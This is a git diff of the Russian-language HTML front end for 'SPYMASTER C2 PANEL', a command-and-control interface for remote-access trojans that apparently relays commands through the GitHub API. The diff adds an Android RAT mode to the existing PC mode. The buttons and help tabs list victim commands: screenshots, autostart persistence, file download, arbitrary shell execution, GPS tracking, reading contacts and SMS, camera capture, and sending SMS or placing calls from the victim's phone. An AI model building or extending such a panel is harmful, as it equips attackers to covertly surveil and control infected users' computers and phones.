@@ -2,141 +2,291 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>SPYMASTER C2 PANEL</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
 </head>
 <body>
+    <div class="stars"></div>
+    <div class="twinkling"></div>
+    <div class="planet"></div>
+    <div class="scan-line"></div>
+
     <div class="container">
-        <!-- Хакерский ASCII заголовок -->
+        <!-- Хакерский ASCII заголовок с анимацией -->
         <div class="ascii-header">
-            <pre>
-╔═══════════════════════════════════════════════════════════════════════════╗
-║  ███████╗██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗  ║
-║  ██╔════╝██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗ ║
-║  ███████╗██████╔╝ ╚████╔╝     ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝ ║
-║  ╚════██║██╔═══╝   ╚██╔╝      ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗ ║
-║  ███████║██║        ██║       ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║ ║
-║  ╚══════╝╚═╝        ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ ║
-║                                                                                   ║
-║                         GITHUB C2 PANEL v4.0                                      ║
-║                         АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ                               ║
-╚═══════════════════════════════════════════════════════════════════════════════════╝
+            <pre class="glitch" data-text="
+╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗
+║  ███████╗██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗                   ║
+║  ██╔════╝██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗                  ║
+║  ███████╗██████╔╝ ╚████╔╝     ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝                  ║
+║  ╚════██║██╔═══╝   ╚██╔╝      ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗                  ║
+║  ███████║██║        ██║       ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║                  ║
+║  ╚══════╝╚═╝        ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝                  ║
+║                                                                                                     ║
+║                         ░██████╗██████╗░░█████╗░███╗░░██╗████████╗██████╗░░█████╗░██╗░░░░░          ║
+║                         ██╔════╝██╔══██╗██╔══██╗████╗░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░          ║
+║                         ╚█████╗░██████╔╝███████║██╔██╗██║░░░██║░░░██████╔╝██║░░██║██║░░░░░          ║
+║                         ░╚═══██╗██╔═══╝░██╔══██║██║╚████║░░░██║░░░██╔══██╗██║░░██║██║░░░░░          ║
+║                         ██████╔╝██║░░░░░██║░░██║██║░╚███║░░░██║░░░██║░░██║╚█████╔╝███████╗          ║
+║                         ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚══════╝          ║
+║                                                                                                     ║
+║                         GITHUB C2 PANEL v4.0                                                         ║
+║                         АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ                                                   ║
+╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝
+">
+╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗
+║  ███████╗██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗                   ║
+║  ██╔════╝██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗                  ║
+║  ███████╗██████╔╝ ╚████╔╝     ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝                  ║
+║  ╚════██║██╔═══╝   ╚██╔╝      ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗                  ║
+║  ███████║██║        ██║       ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║                  ║
+║  ╚══════╝╚═╝        ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝                  ║
+║                                                                                                     ║
+║                         ░██████╗██████╗░░█████╗░███╗░░██╗████████╗██████╗░░█████╗░██╗░░░░░          ║
+║                         ██╔════╝██╔══██╗██╔══██╗████╗░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░          ║
+║                         ╚█████╗░██████╔╝███████║██╔██╗██║░░░██║░░░██████╔╝██║░░██║██║░░░░░          ║
+║                         ░╚═══██╗██╔═══╝░██╔══██║██║╚████║░░░██║░░░██╔══██╗██║░░██║██║░░░░░          ║
+║                         ██████╔╝██║░░░░░██║░░██║██║░╚███║░░░██║░░░██║░░██║╚█████╔╝███████╗          ║
+║                         ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚══════╝          ║
+║                                                                                                     ║
+║                         GITHUB C2 PANEL v4.0                                                         ║
+║                         АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ                                                   ║
+╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝
             </pre>
         </div>
 
-        <!-- Статус подключения -->
-        <div class="status-bar">
-            <div class="status-indicator" id="statusIndicator"></div>
-            <span id="statusText">ПРОВЕРКА ПОДКЛЮЧЕНИЯ...</span>
-            <div class="stats" id="stats">
-                <span>📄 РЕЗУЛЬТАТОВ: <span id="resultsCount">0</span></span>
-                <span>📸 СКРИНШОТОВ: <span id="screensCount">0</span></span>
-                <span>💻 КЛИЕНТОВ: <span id="clientsCount">0</span></span>
+        <!-- Переключатель режимов -->
+        <div class="mode-switch">
+            <button class="mode-btn active" data-mode="pc">💻 PC RAT</button>
+            <button class="mode-btn" data-mode="android">📱 ANDROID RAT</button>
+        </div>
+
+        <!-- ==================== PC РЕЖИМ ==================== -->
+        <div id="pcMode" class="mode-content active">
+            <!-- Статус бар -->
+            <div class="status-bar">
+                <div class="status-indicator" id="statusIndicator"></div>
+                <span id="statusText">ПРОВЕРКА ПОДКЛЮЧЕНИЯ...</span>
+                <div class="stats" id="stats">
+                    <span>📄 РЕЗУЛЬТАТОВ: <span id="resultsCount">0</span></span>
+                    <span>📸 СКРИНШОТОВ: <span id="screensCount">0</span></span>
+                    <span>💻 КЛИЕНТОВ: <span id="clientsCount">0</span></span>
+                </div>
+            </div>
+
+            <!-- Основной контент PC -->
+            <div class="main-content">
+                <div class="panel commands-panel">
+                    <div class="panel-header">🎯 ОТПРАВКА КОМАНД</div>
+                    
+                    <div class="client-select">
+                        <label>📱 ВЫБРАТЬ КЛИЕНТА:</label>
+                        <select id="clientSelect">
+                            <option value="all">ВСЕ КЛИЕНТЫ</option>
+                        </select>
+                    </div>
+
+                    <div class="quick-commands">
+                        <button class="cmd-btn neon-btn" data-cmd="/info">📱 INFO</button>
+                        <button class="cmd-btn neon-btn" data-cmd="/screenshot">📸 SCREEN</button>
+                        <button class="cmd-btn neon-btn" data-cmd="/persist">🔒 PERSIST</button>
+                        <button class="cmd-btn neon-btn" data-cmd="/destroy">💀 DESTROY</button>
+                    </div>
+
+                    <div class="custom-command">
+                        <input type="text" id="customCmd" placeholder="Введите команду...">
+                        <button id="sendCustomBtn" class="neon-btn">📨 ОТПРАВИТЬ</button>
+                    </div>
+
+                    <div class="advanced-commands">
+                        <div class="section-title">⚙️ РАСШИРЕННЫЕ КОМАНДЫ</div>
+                        <div class="cmd-group">
+                            <button class="cmd-small neon-btn" data-cmd="/files C:\\">📁 FILES C:\</button>
+                            <button class="cmd-small neon-btn" data-cmd="/files D:\\">📁 FILES D:\</button>
+                        </div>
+                        <div class="cmd-group">
+                            <input type="text" id="downloadPath" placeholder="Путь к файлу">
+                            <button class="cmd-small neon-btn" id="downloadBtn">⬇️ DOWNLOAD</button>
+                        </div>
+                        <div class="cmd-group">
+                            <input type="text" id="shellCmd" placeholder="CMD команда">
+                            <button class="cmd-small neon-btn" id="shellBtn">💻 EXECUTE</button>
+                        </div>
+                    </div>
+
+                    <div class="repo-controls">
+                        <button id="clearCommandsBtn" class="danger-btn neon-btn">🗑 ОЧИСТИТЬ КОМАНДЫ</button>
+                        <button id="clearAllBtn" class="danger-btn neon-btn">💣 ОЧИСТИТЬ ВСЁ</button>
+                        <button id="refreshBtn" class="info-btn neon-btn">🔄 ОБНОВИТЬ</button>
+                    </div>
+                </div>
+
+                <div class="panel results-panel">
+                    <div class="panel-header">
+                        <span>📥 РЕЗУЛЬТАТЫ</span>
+                        <div class="tabs">
+                            <button class="tab-btn active" data-tab="logs">📜 ЛОГИ</button>
+                            <button class="tab-btn" data-tab="clients">💻 КЛИЕНТЫ</button>
+                            <button class="tab-btn" data-tab="screens">🖼️ СКРИНШОТЫ</button>
+                            <button class="tab-btn" data-tab="files">📁 ФАЙЛЫ</button>
+                            <button class="tab-btn" data-tab="commands-help">📖 КОМАНДЫ</button>
+                        </div>
+                    </div>
+                    
+                    <div id="logsTab" class="tab-content active">
+                        <div class="log-container" id="logContainer">
+                            <div class="log-entry system">[СИСТЕМА] Панель управления запущена</div>
+                        </div>
+                    </div>
+
+                    <div id="clientsTab" class="tab-content">
+                        <div class="clients-list" id="clientsList">
+                            <div class="empty-message">Нет подключенных клиентов</div>
+                        </div>
+                    </div>
+
+                    <div id="screensTab" class="tab-content">
+                        <div class="screens-grid" id="screensGrid">
+                            <div class="empty-message">Нет скриншотов</div>
+                        </div>
+                    </div>
+
+                    <div id="filesTab" class="tab-content">
+                        <div class="files-list" id="filesList">
+                            <div class="empty-message">Нет загруженных файлов</div>
+                        </div>
+                    </div>
+
+                    <div id="commandsHelpTab" class="tab-content">
+                        <div class="commands-help">
+                            <h3>📖 ДОСТУПНЫЕ КОМАНДЫ (PC)</h3>
+                            <div class="help-grid">
+                                <div class="help-card"><code>/info</code> - Информация о ПК</div>
+                                <div class="help-card"><code>/screenshot</code> - Скриншот экрана</div>
+                                <div class="help-card"><code>/files C:\</code> - Список файлов</div>
+                                <div class="help-card"><code>/download C:\file.txt</code> - Скачать файл</div>
+                                <div class="help-card"><code>/cmd ipconfig</code> - Выполнить команду</div>
+                                <div class="help-card"><code>/persist</code> - Добавить в автозагрузку</div>
+                                <div class="help-card"><code>/destroy</code> - Удалить RAT</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
 
-        <!-- Основной контент -->
-        <div class="main-content">
-            <!-- Левая панель - Команды -->
-            <div class="panel commands-panel">
-                <div class="panel-header">
-                    <span>🎯 ОТПРАВКА КОМАНД</span>
-                </div>
-                
-                <!-- Выбор клиента -->
-                <div class="client-select">
-                    <label>📱 ВЫБРАТЬ КЛИЕНТА:</label>
-                    <select id="clientSelect">
-                        <option value="all">ВСЕ КЛИЕНТЫ</option>
-                    </select>
-                </div>
-
-                <!-- Быстрые команды -->
-                <div class="quick-commands">
-                    <button class="cmd-btn" data-cmd="/info">📱 INFO</button>
-                    <button class="cmd-btn" data-cmd="/screenshot">📸 SCREEN</button>
-                    <button class="cmd-btn" data-cmd="/persist">🔒 PERSIST</button>
-                    <button class="cmd-btn" data-cmd="/destroy">💀 DESTROY</button>
-                </div>
-
-                <!-- Кастомная команда -->
-                <div class="custom-command">
-                    <input type="text" id="customCmd" placeholder="Введите команду...">
-                    <button id="sendCustomBtn">📨 ОТПРАВИТЬ</button>
-                </div>
-
-                <!-- Расширенные команды -->
-                <div class="advanced-commands">
-                    <div class="section-title">⚙️ РАСШИРЕННЫЕ КОМАНДЫ</div>
-                    <div class="cmd-group">
-                        <button class="cmd-small" data-cmd="/files C:\\">📁 FILES C:\</button>
-                        <button class="cmd-small" data-cmd="/files D:\\">📁 FILES D:\</button>
-                        <button class="cmd-small" data-cmd="/files C:\\Users">📁 FILES USERS</button>
-                    </div>
-                    <div class="cmd-group">
-                        <input type="text" id="downloadPath" placeholder="Путь к файлу (C:\file.txt)">
-                        <button class="cmd-small" id="downloadBtn">⬇️ DOWNLOAD</button>
-                    </div>
-                    <div class="cmd-group">
-                        <input type="text" id="shellCmd" placeholder="CMD команда (ipconfig)">
-                        <button class="cmd-small" id="shellBtn">💻 EXECUTE</button>
-                    </div>
-                </div>
-
-                <!-- Кнопки управления репозиторием -->
-                <div class="repo-controls">
-                    <button id="clearCommandsBtn" class="danger-btn">🗑 ОЧИСТИТЬ КОМАНДЫ</button>
-                    <button id="clearAllBtn" class="danger-btn">💣 ОЧИСТИТЬ ВСЁ</button>
-                    <button id="refreshBtn" class="info-btn">🔄 ОБНОВИТЬ</button>
+        <!-- ==================== ANDROID РЕЖИМ ==================== -->
+        <div id="androidMode" class="mode-content">
+            <div class="status-bar android-status">
+                <div class="status-indicator" id="androidStatusIndicator"></div>
+                <span id="androidStatusText">ПРОВЕРКА ПОДКЛЮЧЕНИЯ...</span>
+                <div class="stats" id="androidStats">
+                    <span>📱 УСТРОЙСТВ: <span id="androidDevicesCount">0</span></span>
+                    <span>📍 GPS: <span id="androidGpsCount">0</span></span>
                 </div>
             </div>
 
-            <!-- Правая панель - Результаты -->
-            <div class="panel results-panel">
-                <div class="panel-header">
-                    <span>📥 РЕЗУЛЬТАТЫ</span>
-                    <div class="tabs">
-                        <button class="tab-btn active" data-tab="logs">📜 ЛОГИ</button>
-                        <button class="tab-btn" data-tab="clients">💻 КЛИЕНТЫ</button>
-                        <button class="tab-btn" data-tab="screens">🖼️ СКРИНШОТЫ</button>
-                        <button class="tab-btn" data-tab="files">📁 ФАЙЛЫ</button>
+            <div class="main-content">
+                <div class="panel commands-panel">
+                    <div class="panel-header">🎯 ANDROID КОМАНДЫ</div>
+                    
+                    <div class="client-select">
+                        <label>📱 ВЫБРАТЬ УСТРОЙСТВО:</label>
+                        <select id="androidClientSelect">
+                            <option value="all">ВСЕ УСТРОЙСТВА</option>
+                        </select>
                     </div>
-                </div>
-                
-                <!-- Вкладка ЛОГИ -->
-                <div id="logsTab" class="tab-content active">
-                    <div class="log-container" id="logContainer">
-                        <div class="log-entry system">[СИСТЕМА] Панель управления запущена</div>
-                        <div class="log-entry system">[СИСТЕМА] Ожидание подключения клиентов...</div>
+
+                    <div class="quick-commands android-commands">
+                        <button class="cmd-btn neon-btn" data-android-cmd="/info">📱 INFO</button>
+                        <button class="cmd-btn neon-btn" data-android-cmd="/location">📍 GPS</button>
+                        <button class="cmd-btn neon-btn" data-android-cmd="/contacts">📞 CONTACTS</button>
+                        <button class="cmd-btn neon-btn" data-android-cmd="/sms">💬 SMS</button>
+                        <button class="cmd-btn neon-btn" data-android-cmd="/camera">📸 CAMERA</button>
+                        <button class="cmd-btn neon-btn" data-android-cmd="/screenshot">🖼️ SCREEN</button>
+                        <button class="cmd-btn neon-btn" data-android-cmd="/destroy">💀 DESTROY</button>
+                    </div>
+
+                    <div class="custom-command">
+                        <input type="text" id="androidCustomCmd" placeholder="Введите команду...">
+                        <button id="androidSendCustomBtn" class="neon-btn">📨 ОТПРАВИТЬ</button>
+                    </div>
+
+                    <div class="advanced-commands">
+                        <div class="section-title">⚙️ РАСШИРЕННЫЕ</div>
+                        <div class="cmd-group">
+                            <input type="text" id="androidSmsNumber" placeholder="Номер телефона">
+                            <input type="text" id="androidSmsText" placeholder="Текст SMS">
+                            <button class="cmd-small neon-btn" id="androidSmsBtn">✉️ SEND SMS</button>
+                        </div>
+                        <div class="cmd-group">
+                            <input type="text" id="androidCallNumber" placeholder="Номер для звонка">
+                            <button class="cmd-small neon-btn" id="androidCallBtn">📞 CALL</button>
+                        </div>
+                        <div class="cmd-group">
+                            <input type="text" id="androidFilePath" placeholder="Путь к файлу (/sdcard)">
+                            <button class="cmd-small neon-btn" id="androidFilesBtn">📁 LIST FILES</button>
+                        </div>
+                        <div class="cmd-group">
+                            <input type="text" id="androidShellCmd" placeholder="Shell команда">
+                            <button class="cmd-small neon-btn" id="androidShellBtn">💻 EXECUTE</button>
+                        </div>
                     </div>
                 </div>
 
-                <!-- Вкладка КЛИЕНТЫ -->
-                <div id="clientsTab" class="tab-content">
-                    <div class="clients-list" id="clientsList">
-                        <div class="empty-message">Нет подключенных клиентов</div>
+                <div class="panel results-panel">
+                    <div class="panel-header">
+                        <span>📥 ANDROID РЕЗУЛЬТАТЫ</span>
+                        <div class="tabs">
+                            <button class="tab-btn active" data-android-tab="logs">📜 ЛОГИ</button>
+                            <button class="tab-btn" data-android-tab="devices">📱 УСТРОЙСТВА</button>
+                            <button class="tab-btn" data-android-tab="photos">📸 ФОТО</button>
+                            <button class="tab-btn" data-android-tab="commands-help">📖 КОМАНДЫ</button>
+                        </div>
                     </div>
-                </div>
-
-                <!-- Вкладка СКРИНШОТЫ -->
-                <div id="screensTab" class="tab-content">
-                    <div class="screens-grid" id="screensGrid">
-                        <div class="empty-message">Нет скриншотов</div>
+                    
+                    <div id="androidLogsTab" class="tab-content active">
+                        <div class="log-container" id="androidLogContainer">
+                            <div class="log-entry system">[СИСТЕМА] Android панель запущена</div>
+                        </div>
                     </div>
-                </div>
 
-                <!-- Вкладка ФАЙЛЫ -->
-                <div id="filesTab" class="tab-content">
-                    <div class="files-list" id="filesList">
-                        <div class="empty-message">Нет загруженных файлов</div>
+                    <div id="androidDevicesTab" class="tab-content">
+                        <div class="clients-list" id="androidDevicesList">
+                            <div class="empty-message">Нет подключенных устройств</div>
+                        </div>
+                    </div>
+
+                    <div id="androidPhotosTab" class="tab-content">
+                        <div class="screens-grid" id="androidPhotosGrid">
+                            <div class="empty-message">Нет фото</div>
+                        </div>
+                    </div>
+
+                    <div id="androidCommandsHelpTab" class="tab-content">
+                        <div class="commands-help">
+                            <h3>📖 ДОСТУПНЫЕ КОМАНДЫ (ANDROID)</h3>
+                            <div class="help-grid">
+                                <div class="help-card"><code>/info</code> - Информация об устройстве</div>
+                                <div class="help-card"><code>/location</code> - GPS координаты</div>
+                                <div class="help-card"><code>/contacts</code> - Список контактов</div>
+                                <div class="help-card"><code>/sms</code> - Чтение SMS</div>
+                                <div class="help-card"><code>/camera</code> - Фото с камеры</div>
+                                <div class="help-card"><code>/screenshot</code> - Скриншот экрана</div>
+                                <div class="help-card"><code>/files /sdcard</code> - Список файлов</div>
+                                <div class="help-card"><code>/cmd ls</code> - Shell команда</div>
+                                <div class="help-card"><code>/sms:номер текст</code> - Отправить SMS</div>
+                                <div class="help-card"><code>/call:номер</code> - Позвонить</div>
+                                <div class="help-card"><code>/destroy</code> - Удалить RAT</div>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Нижняя панель -->
         <div class="footer">
             <span>🔐 ЗАЩИЩЕННОЕ ПОДКЛЮЧЕНИЕ | GITHUB API</span>
             <span>🐀 КРЫСА ГУБЕРНАТОРСКАЯ © 2024</span>
